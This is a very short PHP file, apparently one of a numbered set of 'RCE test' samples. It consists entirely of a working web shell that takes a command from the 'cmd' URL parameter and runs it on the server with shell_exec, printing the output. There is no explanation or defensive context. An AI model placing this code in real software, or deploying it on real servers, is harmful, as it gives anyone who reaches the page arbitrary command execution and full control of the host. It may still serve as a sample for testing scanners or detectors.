<?php
// RCE test variation #143
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>